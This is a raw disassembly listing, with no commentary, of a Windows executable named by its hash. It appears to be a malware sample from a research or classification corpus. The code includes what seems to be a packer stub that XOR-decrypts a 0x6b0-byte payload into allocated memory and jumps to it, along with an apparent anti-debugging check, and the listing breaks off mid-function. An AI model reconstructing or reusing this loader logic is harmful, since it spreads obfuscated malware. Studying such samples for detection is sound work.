
9362df923ef413a2016d7341e235a89c7d734ffab7ab6d416e6c767edd10ea44.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	mov    edi,edi
  401006:	push   ebp
  401007:	mov    ebp,esp
  401009:	sub    esp,0x58
  40100c:	push   edx
  40100d:	push   0x403038
  401012:	pop    eax
  401013:	call   DWORD PTR cs:[eax]
  401016:	pop    edx
  401017:	push   edx
  401018:	push   DWORD PTR [edx+0x4d0]
  40101e:	push   edi
  40101f:	push   DWORD PTR [edx+0x128]
  401025:	push   DWORD PTR [edx+0x2f8]
  40102b:	call   0x401e1c
  401030:	add    esp,0x10
  401033:	pop    edx
  401034:	push   edx
  401035:	push   0x0
  401037:	push   0x40300c
  40103c:	pop    eax
  40103d:	call   DWORD PTR cs:[eax]
  401040:	pop    edx
  401041:	sub    esp,0xffffffa8
  401044:	mov    ebp,DWORD PTR [esp]
  401047:	add    esp,0x4
  40104a:	ret    
  40104b:	add    BYTE PTR [edi],cl
  40104d:	xchg   DWORD PTR [esi],eax
	...
  401057:	add    BYTE PTR [ebx-0x74aa9f01],cl
  40105d:	in     al,dx
  40105e:	sub    esp,0x30
  401061:	push   edx
  401062:	mov    edx,0x0
  401067:	push   edx
  401068:	push   0x40303c
  40106d:	pop    eax
  40106e:	call   DWORD PTR cs:[eax]
  401071:	pop    edx
  401072:	test   eax,eax
  401074:	je     0x401077
  401076:	ret    
  401077:	push   edx
  401078:	push   0x0
  40107a:	push   0x403008
  40107f:	pop    eax
  401080:	call   DWORD PTR cs:[eax]
  401083:	pop    edx
  401084:	push   edx
  401085:	push   DWORD PTR [edx+0x190]
  40108b:	push   DWORD PTR [edx+0x54]
  40108e:	push   DWORD PTR [edx+0x108]
  401094:	push   esi
  401095:	call   0x401a24
  40109a:	add    esp,0x10
  40109d:	pop    edx
  40109e:	mov    eax,0x403034
  4010a3:	mov    eax,DWORD PTR [eax]
  4010a5:	push   eax
  4010a6:	push   DWORD PTR [edx+0x284]
  4010ac:	pop    esi
  4010ad:	call   esi
  4010af:	sub    esp,0xffffffd0
  4010b2:	mov    ebp,DWORD PTR [esp]
  4010b5:	add    esp,0x4
  4010b8:	ret    
  4010b9:	add    BYTE PTR [eax],al
  4010bb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4010c1:	sub    esp,0x28
  4010c4:	push   edx
  4010c5:	push   DWORD PTR [edx+0x224]
  4010cb:	push   edi
  4010cc:	push   DWORD PTR [edx+0x3b4]
  4010d2:	call   0x40199c
  4010d7:	add    esp,0xc
  4010da:	pop    edx
  4010db:	push   edx
  4010dc:	mov    edi,0x0
  4010e1:	push   edi
  4010e2:	push   0x40306c
  4010e7:	pop    eax
  4010e8:	call   DWORD PTR cs:[eax]
  4010eb:	pop    edx
  4010ec:	push   edx
  4010ed:	lea    edx,[edx]
  4010ef:	push   edx
  4010f0:	push   0x403034
  4010f5:	pop    eax
  4010f6:	call   DWORD PTR cs:[eax]
  4010f9:	test   eax,eax
  4010fb:	jne    0x4010ed
  4010fd:	pop    edx
  4010fe:	sub    esp,0xffffffd8
  401101:	mov    ebp,DWORD PTR [esp]
  401104:	add    esp,0x4
  401107:	ret    
  401108:	mov    edi,edi
  40110a:	push   ebp
  40110b:	mov    ebp,esp
  40110d:	sub    esp,0x24
  401110:	push   edx
  401111:	push   DWORD PTR [edx+0x224]
  401117:	push   DWORD PTR [edx+0xb4]
  40111d:	call   0x4013cc
  401122:	add    esp,0x8
  401125:	pop    edx
  401126:	push   edx
  401127:	mov    ecx,0x0
  40112c:	push   ecx
  40112d:	push   0x40300c
  401132:	pop    eax
  401133:	call   DWORD PTR cs:[eax]
  401136:	pop    edx
  401137:	push   edx
  401138:	push   0x0
  40113a:	push   0x403024
  40113f:	pop    eax
  401140:	call   DWORD PTR cs:[eax]
  401143:	pop    edx
  401144:	sub    esp,0xffffffdc
  401147:	mov    ebp,DWORD PTR [esp]
  40114a:	add    esp,0x4
  40114d:	ret    
	...
  401156:	add    BYTE PTR [eax],al
  401158:	mov    edi,edi
  40115a:	push   ebp
  40115b:	mov    ebp,esp
  40115d:	sub    esp,0x48
  401160:	push   edx
  401161:	push   0x403038
  401166:	pop    eax
  401167:	call   DWORD PTR cs:[eax]
  40116a:	pop    edx
  40116b:	push   edx
  40116c:	push   esi
  40116d:	push   DWORD PTR [edx+0xc8]
  401173:	push   ebx
  401174:	call   0x401b94
  401179:	add    esp,0xc
  40117c:	pop    edx
  40117d:	push   edx
  40117e:	mov    eax,0x0
  401183:	push   eax
  401184:	push   0x40306c
  401189:	pop    eax
  40118a:	call   DWORD PTR cs:[eax]
  40118d:	pop    edx
  40118e:	sub    esp,0xffffffb8
  401191:	mov    ebp,DWORD PTR [esp]
  401194:	add    esp,0x4
  401197:	ret    
  401198:	add    BYTE PTR [eax],al
  40119a:	add    BYTE PTR [eax],al
  40119c:	mov    edi,edi
  40119e:	push   ebp
  40119f:	mov    ebp,esp
  4011a1:	sub    esp,0x20
  4011a4:	push   edx
  4011a5:	mov    esi,0x6b0
  4011aa:	push   esi
  4011ab:	mov    ebx,0x6b0
  4011b0:	push   ebx
  4011b1:	mov    eax,0x40000
  4011b6:	push   eax
  4011b7:	push   0x403004
  4011bc:	pop    ecx
  4011bd:	push   DWORD PTR [ecx]
  4011bf:	sub    DWORD PTR [esp],0x2
  4011c3:	push   0x403010
  4011c8:	pop    ecx
  4011c9:	pop    DWORD PTR [ecx]
  4011cb:	push   0x403010
  4011d0:	pop    eax
  4011d1:	call   DWORD PTR cs:[eax]
  4011d4:	xchg   DWORD PTR [esp],eax
  4011d7:	mov    edx,eax
  4011d9:	pop    ebx
  4011da:	mov    DWORD PTR [edx+0x284],ebx
  4011e0:	mov    esi,DWORD PTR [edx+0x284]
  4011e6:	mov    ebx,esi
  4011e8:	sub    ecx,ecx
  4011ea:	dec    ecx
  4011eb:	and    ecx,0x401e79
  4011f1:	mov    esi,DWORD PTR [ecx]
  4011f3:	mov    DWORD PTR [ebx],esi
  4011f5:	add    ecx,0x3
  4011f8:	add    ebx,0x3
  4011fb:	mov    esi,0x6a719112
  401200:	xor    eax,eax
  401202:	cmp    eax,0x6b0
  401207:	je     0x401225
  401209:	sub    eax,0xfffffffc
  40120c:	mov    edi,esi
  40120e:	xor    edi,DWORD PTR [ecx]
  401210:	sub    edi,0x1
  401213:	mov    DWORD PTR [ebx],edi
  401215:	push   DWORD PTR [ebx]
  401217:	mov    esi,0xfffffffc
  40121c:	sub    ecx,esi
  40121e:	sub    ebx,esi
  401220:	pop    esi
  401221:	bswap  esi
  401223:	jmp    0x401202
  401225:	push   edx
  401226:	push   0x0
  401228:	push   0x403084
  40122d:	pop    eax
  40122e:	call   DWORD PTR cs:[eax]
  401231:	pop    edx
  401232:	sub    esp,0xffffffe0
  401235:	pop    ebp
  401236:	ret    
  401237:	add    BYTE PTR [ebx-0x1374aa01],cl
  40123d:	sub    esp,0x40
  401240:	push   edx
  401241:	push   DWORD PTR [edx+0x10c]
  401247:	push   ecx
  401248:	push   DWORD PTR [edx+0x3f4]
  40124e:	push   DWORD PTR [edx+0xdc]
  401254:	call   0x40119c
  401259:	add    esp,0x10
  40125c:	pop    edx
  40125d:	push   edx
  40125e:	push   0x0
  401260:	push   0x403084
  401265:	pop    eax
  401266:	call   DWORD PTR cs:[eax]
  401269:	pop    edx
  40126a:	push   edx
  40126b:	push   0x0
  40126d:	push   0x403048
  401272:	pop    eax
  401273:	call   DWORD PTR cs:[eax]
  401276:	pop    edx
  401277:	sub    esp,0xffffffc0
  40127a:	mov    ebp,DWORD PTR [esp]
  40127d:	add    esp,0x4
  401280:	ret    
  401281:	add    BYTE PTR [eax],al
  401283:	add    BYTE PTR [ebx-0x1374aa01],cl
  401289:	sub    esp,0x38
  40128c:	push   edx
  40128d:	push   ebx
  40128e:	push   DWORD PTR [edx+0x1a0]
  401294:	call   0x401c64
  401299:	add    esp,0x8
  40129c:	pop    edx
  40129d:	push   edx
  40129e:	push   0x403038
  4012a3:	pop    eax
  4012a4:	call   DWORD PTR cs:[eax]
  4012a7:	pop    edx
  4012a8:	push   edx
  4012a9:	push   0x0
  4012ab:	push   0x40303c
  4012b0:	pop    eax
  4012b1:	call   DWORD PTR cs:[eax]
  4012b4:	pop    edx
  4012b5:	sub    esp,0xffffffc8
  4012b8:	mov    ebp,DWORD PTR [esp]
  4012bb:	add    esp,0x4
  4012be:	ret    
  4012bf:	add    BYTE PTR [eax],al
  4012c1:	add    BYTE PTR [eax],al
  4012c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4012c9:	sub    esp,0x40
  4012cc:	push   edx
  4012cd:	mov    ecx,0x0
  4012d2:	push   ecx
  4012d3:	push   0x403044
  4012d8:	pop    eax
  4012d9:	call   DWORD PTR cs:[eax]
  4012dc:	pop    edx
  4012dd:	push   edx
  4012de:	push   DWORD PTR [edx+0x5ec]
  4012e4:	push   eax
  4012e5:	call   0x401cbc
  4012ea:	add    esp,0x8
  4012ed:	pop    edx
  4012ee:	push   edx
  4012ef:	push   0x403018
  4012f4:	pop    eax
  4012f5:	call   DWORD PTR cs:[eax]
  4012f8:	pop    edx
  4012f9:	sub    esp,0xffffffc0
  4012fc:	mov    ebp,DWORD PTR [esp]
  4012ff:	add    esp,0x4
  401302:	ret    
  401303:	add    BYTE PTR [ebx-0x1374aa01],cl
  401309:	sub    esp,0x24
  40130c:	push   edx
  40130d:	push   0x0
  40130f:	push   0x403024
  401314:	pop    eax
  401315:	call   DWORD PTR cs:[eax]
  401318:	pop    edx
  401319:	push   edx
  40131a:	push   ecx
  40131b:	push   DWORD PTR [edx+0x94]
  401321:	push   ebx
  401322:	push   DWORD PTR [edx+0x30]
  401325:	call   0x401950
  40132a:	add    esp,0x10
  40132d:	pop    edx
  40132e:	push   edx
  40132f:	push   0x403018
  401334:	pop    eax
  401335:	call   DWORD PTR cs:[eax]
  401338:	pop    edx
  401339:	sub    esp,0xffffffdc
  40133c:	mov    ebp,DWORD PTR [esp]
  40133f:	add    esp,0x4
  401342:	ret    
  401343:	add    BYTE PTR [eax],al
  401345:	add    BYTE PTR [eax],al
  401347:	add    BYTE PTR [ebx-0x1374aa01],cl
  40134d:	sub    esp,0x30
  401350:	push   edx
  401351:	push   edi
  401352:	push   DWORD PTR [edx+0x128]
  401358:	push   ecx
  401359:	call   0x401158
  40135e:	add    esp,0xc
  401361:	pop    edx
  401362:	push   edx
  401363:	mov    eax,0x0
  401368:	push   eax
  401369:	push   0x403024
  40136e:	pop    eax
  40136f:	call   DWORD PTR cs:[eax]
  401372:	pop    edx
  401373:	push   edx
  401374:	push   0x0
  401376:	push   0x403040
  40137b:	pop    eax
  40137c:	call   DWORD PTR cs:[eax]
  40137f:	pop    edx
  401380:	sub    esp,0xffffffd0
  401383:	mov    ebp,DWORD PTR [esp]
  401386:	add    esp,0x4
  401389:	ret    
  40138a:	add    BYTE PTR [eax],al
  40138c:	mov    edi,edi
  40138e:	push   ebp
  40138f:	mov    ebp,esp
  401391:	sub    esp,0x54
  401394:	push   edx
  401395:	push   ecx
  401396:	push   ebx
  401397:	push   eax
  401398:	push   DWORD PTR [edx+0x110]
  40139e:	call   0x401828
  4013a3:	add    esp,0x10
  4013a6:	pop    edx
  4013a7:	push   edx
  4013a8:	push   0x0
  4013aa:	push   0x403040
  4013af:	pop    eax
  4013b0:	call   DWORD PTR cs:[eax]
  4013b3:	pop    edx
  4013b4:	push   edx
  4013b5:	push   0x403018
  4013ba:	pop    eax
  4013bb:	call   DWORD PTR cs:[eax]
  4013be:	pop    edx
  4013bf:	sub    esp,0xffffffac
  4013c2:	mov    ebp,DWORD PTR [esp]
  4013c5:	add    esp,0x4
  4013c8:	ret    
  4013c9:	add    BYTE PTR [eax],al
  4013cb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4013d1:	sub    esp,0x34
  4013d4:	push   edx
  4013d5:	push   eax
  4013d6:	push   DWORD PTR [edx+0x3e0]
  4013dc:	push   esi
  4013dd:	call   0x401abc
  4013e2:	add    esp,0xc
  4013e5:	pop    edx
  4013e6:	push   edx
  4013e7:	mov    ecx,0x0
  4013ec:	push   ecx
  4013ed:	push   0x403000
  4013f2:	pop    eax
  4013f3:	call   DWORD PTR cs:[eax]
  4013f6:	pop    edx
  4013f7:	push   edx
  4013f8:	mov    ecx,0x0
  4013fd:	push   ecx
  4013fe:	push   0x403024
  401403:	pop    eax
  401404:	call   DWORD PTR cs:[eax]
  401407:	pop    edx
  401408:	sub    esp,0xffffffcc
  40140b:	mov    ebp,DWORD PTR [esp]
  40140e:	add    esp,0x4
  401411:	ret    
  401412:	add    BYTE PTR [eax],al
  401414:	mov    edi,edi
  401416:	push   ebp
  401417:	mov    ebp,esp
  401419:	sub    esp,0x40
  40141c:	push   edx
  40141d:	push   0x0
  40141f:	push   0x403048
  401424:	pop    eax
  401425:	call   DWORD PTR cs:[eax]
  401428:	pop    edx
  401429:	push   edx
  40142a:	push   DWORD PTR [edx+0x64]
  40142d:	push   DWORD PTR [edx+0x88]
  401433:	push   ebx
  401434:	push   DWORD PTR [edx+0x4a0]
  40143a:	call   0x401b50
  40143f:	add    esp,0x10
  401442:	pop    edx
  401443:	push   edx
  401444:	mov    ebx,0x0
  401449:	push   ebx
  40144a:	push   0x403044
  40144f:	pop    eax
  401450:	call   DWORD PTR cs:[eax]
  401453:	pop    edx
  401454:	sub    esp,0xffffffc0
  401457:	mov    ebp,DWORD PTR [esp]
  40145a:	add    esp,0x4
  40145d:	ret    
  40145e:	add    BYTE PTR [eax],al
  401460:	mov    edi,edi
  401462:	push   ebp
  401463:	mov    ebp,esp
  401465:	sub    esp,0x4c
  401468:	push   edx
  401469:	push   0x0
  40146b:	push   0x403048
  401470:	pop    eax
  401471:	call   DWORD PTR cs:[eax]
  401474:	pop    edx
  401475:	push   edx
  401476:	push   edi
  401477:	push   DWORD PTR [edx+0x2d0]
  40147d:	push   DWORD PTR [edx+0x3cc]
  401483:	push   ecx
  401484:	call   0x401634
  401489:	add    esp,0x10
  40148c:	pop    edx
  40148d:	push   edx
  40148e:	push   0x403038
  401493:	pop    eax
  401494:	call   DWORD PTR cs:[eax]
  401497:	pop    edx
  401498:	sub    esp,0xffffffb4
  40149b:	mov    ebp,DWORD PTR [esp]
  40149e:	add    esp,0x4
  4014a1:	ret    
  4014a2:	add    BYTE PTR [eax],al
  4014a4:	mov    edi,edi
  4014a6:	push   ebp
  4014a7:	mov    ebp,esp
  4014a9:	sub    esp,0x5c
  4014ac:	push   edx
  4014ad:	mov    edi,0x0
  4014b2:	push   edi
  4014b3:	push   0x40303c
  4014b8:	pop    eax
  4014b9:	call   DWORD PTR cs:[eax]
  4014bc:	pop    edx
  4014bd:	push   edx
  4014be:	push   DWORD PTR [edx+0x18c]
  4014c4:	push   eax
  4014c5:	call   0x4014f4
  4014ca:	add    esp,0x8
  4014cd:	pop    edx
  4014ce:	push   edx
  4014cf:	push   0x0
  4014d1:	push   0x403070
  4014d6:	pop    eax
  4014d7:	call   DWORD PTR cs:[eax]
  4014da:	pop    edx
  4014db:	sub    esp,0xffffffa4
  4014de:	mov    ebp,DWORD PTR [esp]
  4014e1:	add    esp,0x4
  4014e4:	ret    
	...
  4014f1:	add    BYTE PTR [eax],al
  4014f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4014f9:	sub    esp,0x48
  4014fc:	push   edx
  4014fd:	push   eax
  4014fe:	push   DWORD PTR [edx+0x5e8]
  401504:	call   0x401d84
  401509:	add    esp,0x8
  40150c:	pop    edx
  40150d:	push   edx
  40150e:	push   0x0
  401510:	push   0x403000
  401515:	pop    eax
  401516:	call   DWORD PTR cs:[eax]
  401519:	pop    edx
  40151a:	push   edx
  40151b:	push   0x0
  40151d:	push   0x403070
  401522:	pop    eax
  401523:	call   DWORD PTR cs:[eax]
  401526:	pop    edx
  401527:	sub    esp,0xffffffb8
  40152a:	mov    ebp,DWORD PTR [esp]
  40152d:	add    esp,0x4
  401530:	ret    
  401531:	add    BYTE PTR [eax],al
  401533:	add    BYTE PTR [ebx-0x1374aa01],cl
  401539:	sub    esp,0x2c
  40153c:	push   edx
  40153d:	push   0x0
  40153f:	push   0x403070
  401544:	pop    eax
  401545:	call   DWORD PTR cs:[eax]
  401548:	pop    edx
  401549:	push   edx
  40154a:	push   DWORD PTR [edx+0x1f4]
  401550:	push   ecx
  401551:	call   0x4010bc
  401556:	add    esp,0x8
  401559:	pop    edx
  40155a:	push   edx
  40155b:	push   0x403038
  401560:	pop    eax
  401561:	call   DWORD PTR cs:[eax]
  401564:	pop    edx
  401565:	sub    esp,0xffffffd4
  401568:	mov    ebp,DWORD PTR [esp]
  40156b:	add    esp,0x4
  40156e:	ret    
  40156f:	add    BYTE PTR [eax],al
  401571:	add    BYTE PTR [eax],al
  401573:	add    BYTE PTR [edx+0x0],ch
  401576:	add    DWORD PTR [esp],0x45f000
  40157d:	push   DWORD PTR ds:0x40309c
  401583:	pop    eax
  401584:	xor    ax,ax
  401587:	adc    eax,DWORD PTR [eax+0x3c]
  40158a:	cmp    BYTE PTR [eax+0x1d],0x80
  40158e:	jb     0x401596
  401590:	pop    edx
  401591:	jmp    0x40104c
  401596:	xor    esp,esp
  401598:	int    0x3
  40159a:	add    BYTE PTR [eax],al
  40159c:	add    BYTE PTR [eax],al
  40159e:	add    BYTE PTR [eax],al
  4015a0:	mov    edi,edi
  4015a2:	push   ebp
  4015a3:	mov    ebp,esp
  4015a5:	sub    esp,0x20
  4015a8:	push   edx
  4015a9:	push   0x0
  4015ab:	push   0x40306c
  4015b0:	pop    eax
  4015b1:	call   DWORD PTR cs:[eax]
  4015b4:	pop    edx
  4015b5:	push   edx
  4015b6:	push   esi
  4015b7:	push   DWORD PTR [edx+0x224]
  4015bd:	push   DWORD PTR [edx+0x5c4]
  4015c3:	call   0x401d04
  4015c8:	add    esp,0xc
  4015cb:	pop    edx
  4015cc:	push   edx
  4015cd:	push   0x0
  4015cf:	push   0x40306c
  4015d4:	pop    eax
  4015d5:	call   DWORD PTR cs:[eax]
  4015d8:	pop    edx
  4015d9:	sub    esp,0xffffffe0
  4015dc:	mov    ebp,DWORD PTR [esp]
  4015df:	add    esp,0x4
  4015e2:	ret    
  4015e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4015e9:	sub    esp,0x44
  4015ec:	push   edx
  4015ed:	push   ecx
  4015ee:	push   edi
  4015ef:	push   DWORD PTR [edx+0x250]
  4015f5:	push   DWORD PTR [edx+0xec]
  4015fb:	call   0x4017e4
  401600:	add    esp,0x10
  401603:	pop    edx
  401604:	push   edx
  401605:	lea    ebx,[edx]
  401607:	push   ebx
  401608:	push   0x403034
  40160d:	pop    eax
  40160e:	call   DWORD PTR cs:[eax]
  401611:	test   eax,eax
  401613:	jne    0x401605
  401615:	pop    edx
  401616:	push   edx
  401617:	mov    edx,0x0
  40161c:	push   edx
  40161d:	push   0x40306c
  401622:	pop    eax
  401623:	call   DWORD PTR cs:[eax]
  401626:	pop    edx
  401627:	sub    esp,0xffffffbc
  40162a:	mov    ebp,DWORD PTR [esp]
  40162d:	add    esp,0x4
  401630:	ret    
  401631:	add    BYTE PTR [eax],al
  401633:	add    BYTE PTR [ebx-0x1374aa01],cl
  401639:	sub    esp,0x34
  40163c:	push   edx
  40163d:	push   ebx
  40163e:	push   esi
  40163f:	call   0x401b04
  401644:	add    esp,0x8
  401647:	pop    edx
  401648:	push   edx
  401649:	mov    edx,0x0
  40164e:	push   edx
  40164f:	push   0x403044
  401654:	pop    eax
  401655:	call   DWORD PTR cs:[eax]
  401658:	pop    edx
  401659:	push   edx
  40165a:	push   0x0
  40165c:	push   0x403048
  401661:	pop    eax
  401662:	call   DWORD PTR cs:[eax]
  401665:	pop    edx
  401666:	sub    esp,0xffffffcc
  401669:	mov    ebp,DWORD PTR [esp]
  40166c:	add    esp,0x4
  40166f:	ret    
  401670:	mov    edi,edi
  401672:	push   ebp
  401673:	mov    ebp,esp
  401675:	sub    esp,0x38
  401678:	push   edx
  401679:	push   ecx
  40167a:	push   DWORD PTR [edx+0x228]
  401680:	push   DWORD PTR [edx+0x488]
  401686:	call   0x40186c
  40168b:	add    esp,0xc
  40168e:	pop    edx
  40168f:	push   edx
  401690:	lea    esi,[edx]
  401692:	push   esi
  401693:	push   0x403034
  401698:	pop    eax
  401699:	call   DWORD PTR cs:[eax]
  40169c:	test   eax,eax
  40169e:	jne    0x401690
  4016a0:	pop    edx
  4016a1:	push   edx
  4016a2:	mov    ebx,0x0
  4016a7:	push   ebx
  4016a8:	push   0x403084
  4016ad:	pop    eax
  4016ae:	call   DWORD PTR cs:[eax]
  4016b1:	pop    edx
  4016b2:	sub    esp,0xffffffc8
  4016b5:	mov    ebp,DWORD PTR [esp]
  4016b8:	add    esp,0x4
  4016bb:	ret    
  4016bc:	mov    edi,edi
  4016be:	push   ebp
  4016bf:	mov    ebp,esp
  4016c1:	sub    esp,0x2c
  4016c4:	push   edx
  4016c5:	push   0x0
  4016c7:	push   0x403084
  4016cc:	pop    eax
  4016cd:	call   DWORD PTR cs:[eax]
  4016d0:	pop    edx
  4016d1:	push   edx
  4016d2:	push   eax
  4016d3:	push   esi
  4016d4:	push   ecx
  4016d5:	push   esi
  4016d6:	call   0x401670
  4016db:	add    esp,0x10
  4016de:	pop    edx
  4016df:	push   edx
  4016e0:	push   0x403018
  4016e5:	pop    eax
  4016e6:	call   DWORD PTR cs:[eax]
  4016e9:	pop    edx
  4016ea:	sub    esp,0xffffffd4
  4016ed:	mov    ebp,DWORD PTR [esp]
  4016f0:	add    esp,0x4
  4016f3:	ret    
	...
  40170c:	mov    edi,edi
  40170e:	push   ebp
  40170f:	mov    ebp,esp
  401711:	sub    esp,0x5c
  401714:	push   edx
  401715:	push   DWORD PTR [edx+0x208]
  40171b:	push   edi
  40171c:	push   DWORD PTR [edx+0x36c]
  401722:	call   0x4012c4
  401727:	add    esp,0xc
  40172a:	pop    edx
  40172b:	push   edx
  40172c:	push   0x403018
  401731:	pop    eax
  401732:	call   DWORD PTR cs:[eax]
  401735:	pop    edx
  401736:	push   edx
  401737:	push   0x0
  401739:	push   0x403014
  40173e:	pop    eax
  40173f:	call   DWORD PTR cs:[eax]
  401742:	pop    edx
  401743:	sub    esp,0xffffffa4
  401746:	mov    ebp,DWORD PTR [esp]
  401749:	add    esp,0x4
  40174c:	ret    
	...
  401755:	add    BYTE PTR [eax],al
  401757:	add    BYTE PTR [ebx-0x1374aa01],cl
  40175d:	sub    esp,0x34
  401760:	push   edx
  401761:	push   0x403018
  401766:	pop    eax
  401767:	call   DWORD PTR cs:[eax]
  40176a:	pop    edx
  40176b:	push   edx
  40176c:	push   esi
  40176d:	push   ecx
  40176e:	push   ebx
  40176f:	push   esi
  401770:	call   0x401900
  401775:	add    esp,0x10
  401778:	pop    edx
  401779:	push   edx
  40177a:	push   0x0
  40177c:	push   0x403040
  401781:	pop    eax
  401782:	call   DWORD PTR cs:[eax]
  401785:	pop    edx
  401786:	sub    esp,0xffffffcc
  401789:	mov    ebp,DWORD PTR [esp]
  40178c:	add    esp,0x4
  40178f:	ret    
  401790:	add    BYTE PTR [eax],al
  401792:	add    BYTE PTR [eax],al
  401794:	mov    edi,edi
  401796:	push   ebp
  401797:	mov    ebp,esp
  401799:	sub    esp,0x20
  40179c:	push   edx
  40179d:	push   0x403018
  4017a2:	pop    eax
  4017a3:	call   DWORD PTR cs:[eax]
  4017a6:	pop    edx
  4017a7:	push   edx
  4017a8:	push   DWORD PTR [edx+0x4f4]
  4017ae:	push   DWORD PTR [edx+0x18c]
  4017b4:	push   eax
  4017b5:	call   0x401460
  4017ba:	add    esp,0xc
  4017bd:	pop    edx
  4017be:	push   edx
  4017bf:	mov    ecx,0x0
  4017c4:	push   ecx
  4017c5:	push   0x403040
  4017ca:	pop    eax
  4017cb:	call   DWORD PTR cs:[eax]
  4017ce:	pop    edx
  4017cf:	sub    esp,0xffffffe0
  4017d2:	mov    ebp,DWORD PTR [esp]
  4017d5:	add    esp,0x4
  4017d8:	ret    
	...
  4017e1:	add    BYTE PTR [eax],al
  4017e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4017e9:	sub    esp,0x5c
  4017ec:	push   edx
  4017ed:	push   DWORD PTR [edx+0x3e8]
  4017f3:	push   DWORD PTR [edx+0x224]
  4017f9:	call   0x401348
  4017fe:	add    esp,0x8
  401801:	pop    edx
  401802:	push   edx
  401803:	push   0x0
  401805:	push   0x403070
  40180a:	pop    eax
  40180b:	call   DWORD PTR cs:[eax]
  40180e:	pop    edx
  40180f:	push   edx
  401810:	push   0x0
  401812:	push   0x403000
  401817:	pop    eax
  401818:	call   DWORD PTR cs:[eax]
  40181b:	pop    edx
  40181c:	sub    esp,0xffffffa4
  40181f:	mov    ebp,DWORD PTR [esp]
  401822:	add    esp,0x4
  401825:	ret    
  401826:	add    BYTE PTR [eax],al
  401828:	mov    edi,edi
  40182a:	push   ebp
  40182b:	mov    ebp,esp
  40182d:	sub    esp,0x24
  401830:	push   edx
  401831:	push   ebx
  401832:	push   DWORD PTR [edx+0x4]
  401835:	push   DWORD PTR [edx+0x2c8]
  40183b:	call   0x401c18
  401840:	add    esp,0xc
  401843:	pop    edx
  401844:	push   edx
  401845:	push   0x403018
  40184a:	pop    eax
  40184b:	call   DWORD PTR cs:[eax]
  40184e:	pop    edx
  40184f:	push   edx
  401850:	push   0x0
  401852:	push   0x40300c
  401857:	pop    eax
  401858:	call   DWORD PTR cs:[eax]
  40185b:	pop    edx
  40185c:	sub    esp,0xffffffdc
  40185f:	mov    ebp,DWORD PTR [esp]
  401862:	add    esp,0x4
  401865:	ret    
  401866:	add    BYTE PTR [eax],al
  401868:	add    BYTE PTR [eax],al
  40186a:	add    BYTE PTR [eax],al
  40186c:	mov    edi,edi
  40186e:	push   ebp
  40186f:	mov    ebp,esp
  401871:	sub    esp,0x40
  401874:	push   edx
  401875:	mov    edx,0x0
  40187a:	push   edx
  40187b:	push   0x403014
  401880:	pop    eax
  401881:	call   DWORD PTR cs:[eax]
  401884:	pop    edx
  401885:	push   edx
  401886:	push   DWORD PTR [edx+0x74]
  401889:	push   DWORD PTR [edx+0x1a4]
  40188f:	push   ecx
  401890:	call   0x401bdc
  401895:	add    esp,0xc
  401898:	pop    edx
  401899:	push   edx
  40189a:	push   0x0
  40189c:	push   0x403070
  4018a1:	pop    eax
  4018a2:	call   DWORD PTR cs:[eax]
  4018a5:	pop    edx
  4018a6:	sub    esp,0xffffffc0
  4018a9:	mov    ebp,DWORD PTR [esp]
  4018ac:	add    esp,0x4
  4018af:	ret    
	...
  4018c0:	mov    edi,edi
  4018c2:	push   ebp
  4018c3:	mov    ebp,esp
  4018c5:	sub    esp,0x40
  4018c8:	push   edx
  4018c9:	mov    ecx,0x0
  4018ce:	push   ecx
  4018cf:	push   0x40300c
  4018d4:	pop    eax
  4018d5:	call   DWORD PTR cs:[eax]
  4018d8:	pop    edx
  4018d9:	push   edx
  4018da:	push   DWORD PTR [edx+0x524]
  4018e0:	push   esi
  4018e1:	call   0x40138c
  4018e6:	add    esp,0x8
  4018e9:	pop    edx
  4018ea:	push   edx
  4018eb:	push   0x403038
  4018f0:	pop    eax
  4018f1:	call   DWORD PTR cs:[eax]
  4018f4:	pop    edx
  4018f5:	sub    esp,0xffffffc0
  4018f8:	mov    ebp,DWORD PTR [esp]
  4018fb:	add    esp,0x4
  4018fe:	ret    
  4018ff:	add    BYTE PTR [ebx-0x1374aa01],cl
  401905:	sub    esp,0x54
  401908:	push   edx
  401909:	mov    esi,0x0
  40190e:	push   esi
  40190f:	push   0x403040
  401914:	pop    eax
  401915:	call   DWORD PTR cs:[eax]
  401918:	pop    edx
  401919:	push   edx
  40191a:	push   DWORD PTR [edx+0x37c]
  401920:	push   DWORD PTR [edx+0x3d8]
  401926:	call   0x401304
  40192b:	add    esp,0x8
  40192e:	pop    edx
  40192f:	push   edx
  401930:	push   0x0
  401932:	push   0x403000
  401937:	pop    eax
  401938:	call   DWORD PTR cs:[eax]
  40193b:	pop    edx
  40193c:	sub    esp,0xffffffac
  40193f:	mov    ebp,DWORD PTR [esp]
  401942:	add    esp,0x4
  401945:	ret    
	...
  40194e:	add    BYTE PTR [eax],al
  401950:	mov    edi,edi
  401952:	push   ebp
  401953:	mov    ebp,esp
  401955:	sub    esp,0x20
  401958:	push   edx
  401959:	mov    esi,0x0
  40195e:	push   esi
  40195f:	push   0x403044
  401964:	pop    eax
  401965:	call   DWORD PTR cs:[eax]
  401968:	pop    edx
  401969:	push   edx
  40196a:	push   eax
  40196b:	push   edi
  40196c:	push   DWORD PTR [edx+0x4cc]
  401972:	call   0x401108
  401977:	add    esp,0xc
  40197a:	pop    edx
  40197b:	push   edx
  40197c:	mov    eax,0x0
  401981:	push   eax
  401982:	push   0x403084
  401987:	pop    eax
  401988:	call   DWORD PTR cs:[eax]
  40198b:	pop    edx
  40198c:	sub    esp,0xffffffe0
  40198f:	mov    ebp,DWORD PTR [esp]
  401992:	add    esp,0x4
  401995:	ret    
  401996:	add    BYTE PTR [eax],al
  401998:	add    BYTE PTR [eax],al
  40199a:	add    BYTE PTR [eax],al
  40199c:	mov    edi,edi
  40199e:	push   ebp
  40199f:	mov    ebp,esp
  4019a1:	sub    esp,0x50
  4019a4:	push   edx
  4019a5:	push   0x0
  4019a7:	push   0x40306c
  4019ac:	pop    eax
  4019ad:	call   DWORD PTR cs:[eax]
  4019b0:	pop    edx
  4019b1:	push   edx
  4019b2:	push   DWORD PTR [edx+0x7c]
  4019b5:	push   DWORD PTR [edx+0x1c0]
  4019bb:	push   esi
  4019bc:	call   0x4015e4
